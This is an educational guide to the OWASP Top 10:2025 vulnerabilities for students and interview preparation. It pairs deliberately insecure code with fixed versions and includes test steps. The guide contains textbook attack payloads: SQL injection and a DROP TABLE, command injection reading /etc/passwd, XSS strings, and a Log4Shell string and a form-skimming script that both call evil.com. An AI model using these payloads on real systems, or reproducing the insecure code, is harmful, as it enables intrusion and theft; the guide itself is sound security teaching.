# 🎓 OWASP Top 10:2025 Attacks - Complete Guide

**For Students, Developers, and Interview Preparation**

This guide explains each OWASP Top 10:2025 vulnerability in three ways:
1. 🧑‍🎓 **Simple Explanation** - What it is in plain English
2. 💡 **Real-World Example** - How it happens in practice
3. 🔬 **Technical Deep-Dive** - Technical details for interviews

---

## A01:2025 - Broken Access Control

### 🧑‍🎓 Simple Explanation
**What is it?**
Imagine a library where anyone can walk into the staff-only area and change book records. Broken Access Control means users can access or modify things they shouldn't be allowed to touch.

**Why is it dangerous?**
Users can see other people's private data, change things they shouldn't, or pretend to be someone else (like an admin).

### 💡 Real-World Example

**Bad Code:**
```python
# User views their profile
@app.route('/profile/<user_id>')
def view_profile(user_id):
    user = get_user(user_id)
    return render_template('profile.html', user=user)

# Problem: Any user can change user_id to see ANY profile!
# /profile/1 - sees user 1
# /profile/2 - sees user 2 (not their account!)
```

**Real Attack:**
```
Normal URL: https://bank.com/account?id=12345
Attack URL:  https://bank.com/account?id=12346

Result: Attacker sees someone else's bank account!
```

**Good Code:**
```python
@app.route('/profile/<user_id>')
@login_required
def view_profile(user_id):
    # Check if logged-in user owns this profile
    if current_user.id != user_id:
        return "Access Denied", 403

    user = get_user(user_id)
    return render_template('profile.html', user=user)
```

### 🔬 Technical Deep-Dive

**Types of Broken Access Control:**

1. **IDOR (Insecure Direct Object Reference)**
   - Direct access to objects by changing parameters
   - Example: `/api/invoice/1234` → `/api/invoice/1235`

2. **Missing Function Level Access Control**
   - Admin functions accessible to regular users
   - Example: `/admin/delete_user` works without admin check

3. **Privilege Escalation**
   - Vertical: Normal user → Admin
   - Horizontal: User A → User B's data

**How to Test (Interview Question):**
```
1. Log in as User A
2. Find a URL with User A's ID: /profile?id=123
3. Change ID to another user: /profile?id=456
4. If you see User B's data → Vulnerable!
```

**Prevention:**
- Implement role-based access control (RBAC)
- Check permissions on server-side for EVERY request
- Use framework's built-in authorization
- Deny by default, permit by exception

---

## A02:2025 - Security Misconfiguration

### 🧑‍🎓 Simple Explanation
**What is it?**
Like leaving your house with the door unlocked, windows open, and the alarm off. Security Misconfiguration means the system isn't set up securely.

**Why is it dangerous?**
Attackers can exploit default passwords, see error messages with sensitive info, or access things that should be hidden.

### 💡 Real-World Example

**Bad Configuration:**
```python
# Django settings.py
DEBUG = True  # ❌ Shows detailed errors to users
ALLOWED_HOSTS = ['*']  # ❌ Allows any domain
SECRET_KEY = 'mysecretkey123'  # ❌ Weak, hardcoded key

# Error shown to users:
"""
Traceback (most recent call last):
  File "/app/views.py", line 42, in process_payment
    db.execute("SELECT * FROM users WHERE id=" + user_id)
DatabaseError: You have an error in your SQL syntax
"""
```

**Real Attack:**
```
1. Visit: https://site.com/nonexistent
2. See full error page with:
   - Full file paths: /var/www/myapp/views.py
   - Database details: PostgreSQL 12.3
   - Internal IP addresses: 192.168.1.50
   - Framework version: Django 3.1.0 (known vulnerabilities!)
```

**Good Configuration:**
```python
# Django settings.py
DEBUG = False  # ✅ No detailed errors
ALLOWED_HOSTS = ['mysite.com']  # ✅ Specific domain
SECRET_KEY = os.environ.get('SECRET_KEY')  # ✅ From environment

# Custom error handler
def custom_error(request):
    return render(request, '500.html')  # Generic error page
```

### 🔬 Technical Deep-Dive

**Common Misconfigurations:**

1. **Missing Security Headers**
   ```
   X-Frame-Options: DENY
   X-Content-Type-Options: nosniff
   Content-Security-Policy: default-src 'self'
   Strict-Transport-Security: max-age=31536000
   ```

2. **Default Credentials**
   - admin/admin
   - root/root
   - default/default

3. **Directory Listing Enabled**
   ```
   Apache: Options -Indexes
   Nginx: autoindex off;
   ```

4. **Unnecessary Features Enabled**
   - Debug endpoints in production
   - TRACE/TRACK HTTP methods
   - Unused services running

**How to Test:**
```bash
# Check for default files
curl https://target.com/phpinfo.php
curl https://target.com/.git/config

# Check HTTP methods
curl -X OPTIONS https://target.com

# Check security headers
curl -I https://target.com
```

---

## A03:2025 - Software Supply Chain Failures

### 🧑‍🎓 Simple Explanation
**What is it?**
Imagine buying a pre-made cake from a store, but someone poisoned the flour at the factory. Supply Chain Failures mean the external code you use (libraries, packages) might be compromised.

**Why is it dangerous?**
One poisoned library can affect thousands of websites. Attackers don't hack you directly - they hack what you use.

### 💡 Real-World Example

**Vulnerable Setup:**
```html
<!-- Loading jQuery from CDN without verification -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>

<!-- Problem: If CDN is compromised, malicious code runs on your site! -->
```

**Real Attack (Log4Shell Example):**
```
1. Website uses Log4j 2.14.0 (vulnerable version)
2. Attacker sends: ${jndi:ldap://evil.com/a}
3. Log4j executes attacker's code
4. Server is compromised
```

**Exposed Package Manifest:**
```json
// https://site.com/package.json (publicly accessible!)
{
  "dependencies": {
    "express": "4.16.0",     // Has 6 known vulnerabilities!
    "lodash": "4.17.11",     // Prototype pollution vuln
    "jquery": "1.12.0"       // Multiple XSS issues
  }
}
```

**Good Setup:**
```html
<!-- With Subresource Integrity (SRI) -->
<script
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
  crossorigin="anonymous">
</script>

<!-- If CDN is compromised, browser won't load it! -->
```

### 🔬 Technical Deep-Dive

**Attack Vectors:**

1. **Dependency Confusion**
   ```
   Internal package: @mycompany/auth (private)
   Attacker publishes: @mycompany/auth (public npm)
   npm installs malicious public version!
   ```

2. **Typosquatting**
   ```
   Legitimate: npm install lodash
   Attacker creates: loadsh, lodash-utils, lodash-v4
   Developer makes typo → installs malware
   ```

3. **Compromised CDN**
   - CDN account hacked
   - Malicious JS injected into popular library
   - All sites using it are compromised

**How to Test:**
```bash
# Check for exposed manifests
curl https://target.com/package.json
curl https://target.com/composer.json
curl https://target.com/requirements.txt

# Check for missing SRI
curl https://target.com | grep '<script src="http' | grep -v 'integrity='

# Scan dependencies
npm audit
pip-audit
```

**Prevention:**
- Use SRI for all external resources
- Keep dependencies updated
- Use private registry for internal packages
- Implement SBOM (Software Bill of Materials)
- Regular vulnerability scanning

---

## A04:2025 - Cryptographic Failures

### 🧑‍🎓 Simple Explanation
**What is it?**
Like sending a postcard instead of a sealed letter. Cryptographic Failures mean sensitive data isn't properly encrypted or protected.

**Why is it dangerous?**
Credit cards, passwords, personal info can be stolen in transit or from databases.

### 💡 Real-World Example

**Bad Code:**
```python
# Storing passwords in plain text
def register_user(username, password):
    db.execute(f"INSERT INTO users VALUES ('{username}', '{password}')")
    # Database: | john | mypassword123 | ❌

# Sending sensitive data over HTTP
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']  # ❌ Sent in plain text!
    # Attacker on WiFi can see: username=john&password=secret
```

**Real Attack:**
```
1. User connects to public WiFi
2. Visits http://bank.com (not https!)
3. Enters password: "MySecurePass123"
4. Attacker sniffing network sees:
   POST /login HTTP/1.1
   username=john&password=MySecurePass123
5. Attacker now has credentials!
```

**Good Code:**
```python
# Hashing passwords
from werkzeug.security import generate_password_hash, check_password_hash

def register_user(username, password):
    hashed = generate_password_hash(password)
    db.execute(f"INSERT INTO users VALUES ('{username}', '{hashed}')")
    # Database: | john | pbkdf2:sha256:260000$abc123... | ✅

# Forcing HTTPS
@app.before_request
def force_https():
    if not request.is_secure:
        return redirect(request.url.replace('http://', 'https://'))
```

### 🔬 Technical Deep-Dive

**Common Failures:**

1. **Weak Encryption Algorithms**
   ```
   ❌ MD5 (broken)
   ❌ SHA1 (deprecated)
   ❌ DES, 3DES (weak)

   ✅ SHA-256, SHA-3
   ✅ bcrypt, scrypt, Argon2 (for passwords)
   ✅ AES-256-GCM
   ```

2. **Insufficient Entropy**
   ```python
   # ❌ Bad random
   import random
   token = random.randint(1000, 9999)  # Predictable!

   # ✅ Good random
   import secrets
   token = secrets.token_urlsafe(32)  # Cryptographically secure
   ```

3. **Missing HTTPS**
   ```
   HTTP:  Plaintext, anyone can read
   HTTPS: Encrypted, only sender/receiver can read
   ```

**How to Test:**
```bash
# Check if HTTPS is enforced
curl -I http://site.com
# Should redirect to https://

# Check TLS version
openssl s_client -connect site.com:443
# Should use TLS 1.2 or 1.3

# Check for sensitive data in URLs
https://site.com/login?password=secret123  # ❌ Bad!
```

---

## A05:2025 - Injection

### 🧑‍🎓 Simple Explanation
**What is it?**
Like asking "What's your name?" and someone answers "My name is Alice. Also, delete everyone else's names." Injection means attacker's input is treated as commands.

**Why is it dangerous?**
Attackers can steal data, delete databases, or take complete control of your system.

### 💡 Real-World Example

**Bad Code (SQL Injection):**
```python
@app.route('/search')
def search():
    query = request.args.get('q')
    # User input directly in SQL query
    results = db.execute(f"SELECT * FROM products WHERE name = '{query}'")
    return render_template('results.html', results=results)

# Normal: /search?q=laptop
# SQL: SELECT * FROM products WHERE name = 'laptop' ✅

# Attack: /search?q=' OR '1'='1
# SQL: SELECT * FROM products WHERE name = '' OR '1'='1' ❌
# Returns ALL products!

# Worse: /search?q='; DROP TABLE users; --
# SQL: SELECT * FROM products WHERE name = ''; DROP TABLE users; --'
# Deletes entire users table!
```

**Real Attack:**
```
Step 1: Test for vulnerability
https://site.com/user?id=1'
Error: "You have an error in your SQL syntax"

Step 2: Extract data
https://site.com/user?id=1 UNION SELECT username,password FROM users--

Step 3: Profit
Attacker now has all usernames and passwords!
```

**Good Code:**
```python
# Parameterized queries (safe!)
@app.route('/search')
def search():
    query = request.args.get('q')
    # Use placeholders instead of string concatenation
    results = db.execute("SELECT * FROM products WHERE name = ?", (query,))
    return render_template('results.html', results=results)

# Attack: /search?q=' OR '1'='1
# SQL: SELECT * FROM products WHERE name = ''' OR ''1''=''1'
# Treated as literal string, not SQL code ✅
```

### 🔬 Technical Deep-Dive

**Types of Injection:**

1. **SQL Injection**
   ```sql
   # Vulnerable
   query = f"SELECT * FROM users WHERE id = {user_id}"

   # Attack
   user_id = "1 OR 1=1"
   # Becomes: SELECT * FROM users WHERE id = 1 OR 1=1
   ```

2. **Command Injection**
   ```python
   # Vulnerable
   os.system(f"ping {ip_address}")

   # Attack
   ip_address = "8.8.8.8; cat /etc/passwd"
   # Executes: ping 8.8.8.8; cat /etc/passwd
   ```

3. **NoSQL Injection**
   ```javascript
   // Vulnerable
   db.users.find({ username: req.body.username })

   // Attack
   { "username": { "$ne": null } }
   // Returns all users!
   ```

4. **XSS (Cross-Site Scripting)**
   ```html
   <!-- Vulnerable -->
   <div>Welcome <?php echo $_GET['name']; ?></div>

   <!-- Attack -->
   ?name=<script>alert(document.cookie)</script>
   <!-- Steals session cookies! -->
   ```

**How to Test:**
```
# SQL Injection
Original: /user?id=1
Test: /user?id=1'
If error → vulnerable

# Command Injection
Test: ping; whoami
Test: ping $(whoami)
Test: ping `whoami`

# XSS
Test: <script>alert(1)</script>
Test: <img src=x onerror=alert(1)>
```

**Prevention:**
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Use ORM frameworks
- Escape special characters
- Principle of least privilege

---

## A06:2025 - Insecure Design

### 🧑‍🎓 Simple Explanation
**What is it?**
Like building a bank vault with a glass door. Insecure Design means the fundamental design of the system is flawed, not just the code.

**Why is it dangerous?**
No amount of secure coding can fix a fundamentally broken design. The whole system needs rethinking.

### 💡 Real-World Example

**Bad Design:**
```python
# Online store - NO rate limiting
@app.route('/checkout', methods=['POST'])
def checkout():
    item_id = request.form['item']
    quantity = int(request.form['quantity'])
    total = get_price(item_id) * quantity

    process_payment(total)
    return "Order placed!"

# Attack: Send 1,000,000 orders in 1 second
# Server crashes, database overloaded!
```

**Another Bad Design:**
```python
# Password reset with predictable tokens
def reset_password():
    email = request.form['email']
    # Token is just timestamp! Easy to guess
    token = str(int(time.time()))
    send_email(email, f"Reset: /reset?token={token}")

# Attacker can guess: /reset?token=1701234567
```

**Real Attack:**
```
E-commerce site: Price in hidden form field

<form action="/buy">
  <input type="hidden" name="price" value="999.99">
  <input type="text" name="quantity">
  <button>Buy</button>
</form>

Attacker changes in browser:
<input type="hidden" name="price" value="0.01">

Pays $0.01 for $999.99 item!
```

**Good Design:**
```python
# With rate limiting
from flask_limiter import Limiter

limiter = Limiter(app, default_limits=["200 per day", "50 per hour"])

@app.route('/checkout', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 purchases per minute
def checkout():
    item_id = request.form['item']
    quantity = int(request.form['quantity'])

    # NEVER trust client-side price!
    actual_price = db.get_price(item_id)  # Get from database
    total = actual_price * quantity

    # Add CAPTCHA for large orders
    if total > 1000:
        if not verify_captcha(request.form['captcha']):
            return "CAPTCHA required"

    process_payment(total)
    return "Order placed!"
```

### 🔬 Technical Deep-Dive

**Design Flaws:**

1. **Missing Rate Limiting**
   - Brute force attacks
   - API abuse
   - DoS attacks

2. **Trust of Client-Side Data**
   - Prices
   - Permissions
   - Validation results

3. **Insufficient Anti-Automation**
   - No CAPTCHA on login
   - No bot detection
   - Mass account creation

4. **Business Logic Flaws**
   ```
   Coupon code "SAVE50" = 50% off
   Apply it twice = 100% off!
   System doesn't prevent multiple uses
   ```

**How to Identify:**
```
1. Draw threat model
2. Identify assets (what needs protection?)
3. Identify threats (who/what can attack?)
4. Design controls (how to prevent?)
5. Test assumptions
```

---

## A07:2025 - Authentication Failures

### 🧑‍🎓 Simple Explanation
**What is it?**
Like having a lock on your door but the key is under the doormat. Authentication Failures mean the system doesn't properly verify who you are.

**Why is it dangerous?**
Attackers can pretend to be someone else, guess passwords, or hijack sessions.

### 💡 Real-World Example

**Bad Code:**
```python
# No account lockout
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = db.get_user(username)
    if user and user.password == password:
        session['user_id'] = user.id
        return "Logged in!"
    return "Wrong credentials"

# Attacker can try 1,000,000 passwords!
```

**Real Attack (Credential Stuffing):**
```
Step 1: Get leaked passwords from other sites
        (LinkedIn: user123@email.com / Password123)

Step 2: Try same credentials everywhere
        Netflix: user123@email.com / Password123 ❌
        Amazon:  user123@email.com / Password123 ✅ (works!)

Step 3: Access account, steal data
```

**Session Fixation Attack:**
```
1. Attacker gets session ID: ABC123
2. Tricks victim to use this session:
   https://bank.com/login?session=ABC123
3. Victim logs in (session ABC123 is now authenticated)
4. Attacker uses session ABC123
5. Attacker is now logged in as victim!
```

**Good Code:**
```python
from flask_limiter import Limiter

limiter = Limiter(app)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Only 5 attempts per minute
def login():
    username = request.form['username']
    password = request.form['password']

    # Check if account is locked
    if is_locked(username):
        return "Account locked. Try again in 30 minutes."

    user = db.get_user(username)

    # Use proper password hashing
    if user and check_password_hash(user.password_hash, password):
        # Regenerate session ID after login
        session.regenerate()
        session['user_id'] = user.id

        # Reset failed attempts
        reset_failed_attempts(username)
        return "Logged in!"

    # Increment failed attempts
    increment_failed_attempts(username)
    if get_failed_attempts(username) >= 5:
        lock_account(username)

    return "Wrong credentials"
```

### 🔬 Technical Deep-Dive

**Common Failures:**

1. **Weak Password Policy**
   ```
   ❌ No minimum length
   ❌ No complexity requirements
   ❌ Common passwords accepted (password123)

   ✅ Min 12 characters
   ✅ Mix of upper, lower, numbers, symbols
   ✅ Check against breach database
   ```

2. **Missing MFA/2FA**
   - Password alone isn't enough
   - Need: Something you know + something you have
   - TOTP, SMS, biometric

3. **Insecure Session Management**
   ```
   ❌ Session ID in URL
   ❌ No HttpOnly flag
   ❌ No timeout

   ✅ Session in cookie
   ✅ HttpOnly, Secure, SameSite flags
   ✅ 30-minute timeout
   ```

**How to Test:**
```bash
# Test account lockout
for i in {1..10}; do
  curl -X POST https://site.com/login \
    -d "user=test&pass=wrong$i"
done
# Should lock after 5 attempts

# Test session security
curl -I https://site.com/login
# Check for:
# Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
```

---

## A08:2025 - Software and Data Integrity Failures

### 🧑‍🎓 Simple Explanation
**What is it?**
Like downloading software from the internet without checking if it's safe. Integrity Failures mean you can't verify if code or data has been tampered with.

**Why is it dangerous?**
Malicious code can be injected into software updates, plugins, or data, compromising the entire system.

### 💡 Real-World Example

**Bad Code:**
```html
<!-- Loading library without integrity check -->
<script src="https://cdn.example.com/app.js"></script>

<!-- If CDN is hacked, this could be injected: -->
<script>
  // Malicious code stealing credit cards
  document.querySelectorAll('input[type=password]').forEach(input => {
    input.addEventListener('keyup', () => {
      fetch('https://evil.com/steal?data=' + input.value);
    });
  });
</script>
```

**Real Attack (SolarWinds):**
```
1. Attackers compromise software build system
2. Inject malicious code into software update
3. Company pushes "official" update
4. 18,000 customers install malware
5. Attackers have backdoor to all customers
```

**Good Code:**
```html
<!-- With Subresource Integrity -->
<script
  src="https://cdn.example.com/app.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxxe8yOTk"
  crossorigin="anonymous">
</script>

<!-- Browser verifies hash matches -->
<!-- If file is modified, browser refuses to load it ✅ -->
```

### 🔬 Technical Deep-Dive

**Attack Vectors:**

1. **Insecure Deserialization**
   ```python
   # ❌ Dangerous
   import pickle
   data = pickle.loads(user_input)  # Can execute code!

   # ✅ Safe
   import json
   data = json.loads(user_input)  # Only deserializes data
   ```

2. **Missing Digital Signatures**
   ```
   Software update:
   ❌ update.exe (no signature) - could be fake
   ✅ update.exe + signature - verified by company
   ```

3. **CI/CD Pipeline Compromise**
   ```
   Attacker gets access to:
   - GitHub Actions
   - Jenkins
   - Travis CI

   Injects malicious code during build
   "Official" releases are compromised
   ```

---

## A09:2025 - Logging & Alerting Failures

### 🧑‍🎓 Simple Explanation
**What is it?**
Like having security cameras that don't record. Logging Failures mean you can't see what's happening in your system or detect attacks.

**Why is it dangerous?**
Attackers can operate for months undetected. You can't investigate breaches or meet compliance requirements.

### 💡 Real-World Example

**Bad Code:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    if check_credentials(username, password):
        return "Logged in"
    return "Failed"

# No logging! Can't tell:
# - Who logged in when?
# - Failed login attempts?
# - Brute force attacks?
```

**Real Attack:**
```
Day 1: Attacker tries 100 passwords
Day 2: Attacker tries 100 passwords
Day 3: Attacker tries 100 passwords
...
Day 30: Attacker gets in

No logs = No detection!
Breach discovered 6 months later
No idea what data was accessed
```

**Good Code:**
```python
import logging

logger = logging.getLogger(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr

    if check_credentials(username, password):
        logger.info(f"Successful login: {username} from {ip}")
        return "Logged in"

    logger.warning(f"Failed login: {username} from {ip}")

    # Alert on multiple failures
    if get_failed_attempts(ip) > 10:
        logger.critical(f"Possible brute force from {ip}")
        send_alert_to_security_team(ip)

    return "Failed"
```

### 🔬 Technical Deep-Dive

**What to Log:**

1. **Authentication Events**
   - Successful logins
   - Failed logins
   - Password changes
   - Account lockouts

2. **Authorization Failures**
   - Access denied attempts
   - Privilege escalation attempts

3. **Input Validation Failures**
   - SQL injection attempts
   - XSS attempts
   - Malformed requests

4. **Security Events**
   - File uploads
   - Configuration changes
   - Admin actions

**How NOT to Log:**
```python
# ❌ Don't log sensitive data
logger.info(f"User {username} logged in with password {password}")

# ❌ Don't log to application directory
log_file = "/var/www/html/logs/app.log"  # Publicly accessible!

# ✅ Good logging
logger.info(f"User {username} logged in from {ip}")
log_file = "/var/log/myapp/app.log"  # Outside web root
```

---

## A10:2025 - Mishandling of Exceptional Conditions

### 🧑‍🎓 Simple Explanation
**What is it?**
Like a vending machine that shows its internal manual when you press the wrong button. Poor exception handling means errors reveal too much information.

**Why is it dangerous?**
Error messages can leak:
- Database structure
- File paths
- Technology stack
- Internal IP addresses

### 💡 Real-World Example

**Bad Code:**
```python
@app.route('/user/<user_id>')
def get_user(user_id):
    # No error handling!
    user = db.execute(f"SELECT * FROM users WHERE id = {user_id}")
    return render_template('user.html', user=user)

# When error occurs, shows:
"""
Traceback (most recent call last):
  File "/var/www/myapp/views.py", line 42, in get_user
    user = db.execute("SELECT * FROM users WHERE id = abc")
  File "/usr/lib/python3/db.py", line 156, in execute
    cursor.execute(query)
psycopg2.errors.SyntaxError: invalid input syntax for integer: "abc"

Database: PostgreSQL 12.3
Server: Ubuntu 20.04 at 192.168.1.50
```

**Real Attack:**
```
Attacker sends: /user/abc

Error reveals:
1. Database: PostgreSQL (can use PostgreSQL-specific attacks)
2. Version: 12.3 (has known vulnerabilities)
3. File path: /var/www/myapp (knows directory structure)
4. Internal IP: 192.168.1.50 (network information)
5. Python library paths (knows environment)

Attacker now knows entire tech stack!
```

**Good Code:**
```python
@app.route('/user/<user_id>')
def get_user(user_id):
    try:
        # Validate input
        if not user_id.isdigit():
            return render_template('error.html',
                                 message="Invalid user ID"), 400

        user = db.execute("SELECT * FROM users WHERE id = ?", (user_id,))

        if not user:
            return render_template('error.html',
                                 message="User not found"), 404

        return render_template('user.html', user=user)

    except DatabaseError as e:
        # Log detailed error server-side
        logger.error(f"Database error: {e}")

        # Show generic error to user
        return render_template('error.html',
                             message="An error occurred. Please try again."), 500
```

### 🔬 Technical Deep-Dive

**What Gets Leaked:**

1. **Stack Traces**
   ```
   File "/app/views.py", line 42
   File "/usr/lib/python/db.py", line 156
   → Reveals file paths, technology
   ```

2. **Database Errors**
   ```
   SQL syntax error near 'WHERE id = abc'
   → Reveals database type, query structure
   ```

3. **Framework Errors**
   ```
   Django Debug Mode
   Laravel Whoops Error Page
   → Reveals framework, version, configuration
   ```

**How to Handle:**
```python
# Development
app.config['DEBUG'] = True  # Show detailed errors

# Production
app.config['DEBUG'] = False  # Generic errors only

# Custom error handlers
@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"500 error: {error}")  # Log details
    return render_template('500.html'), 500  # Show generic page
```

---

## 🎯 Interview Tips

### Most Asked Questions:

1. **"Explain the difference between authentication and authorization"**
   - Authentication: "Who are you?" (login)
   - Authorization: "What can you do?" (permissions)

2. **"How would you prevent SQL injection?"**
   - Use parameterized queries
   - Input validation
   - Least privilege database accounts

3. **"What is HTTPS and why is it important?"**
   - Encrypts data in transit
   - Prevents eavesdropping
   - Verifies server identity

4. **"What's the difference between XSS and CSRF?"**
   - XSS: Inject malicious script (affects other users)
   - CSRF: Tricks user's browser (uses user's session)

5. **"How do you store passwords securely?"**
   - Never plain text
   - Use bcrypt/scrypt/Argon2
   - Add salt
   - Use pepper if possible

---

## 📚 Resources for Learning

- **OWASP Website:** https://owasp.org
- **WebGoat:** Practice hacking (legally)
- **DVWA:** Damn Vulnerable Web Application
- **PortSwigger Academy:** Web Security Academy
- **HackTheBox:** Real-world practice

---

**Remember:** Understanding these attacks makes you a better developer!

Good luck with your interviews! 🚀
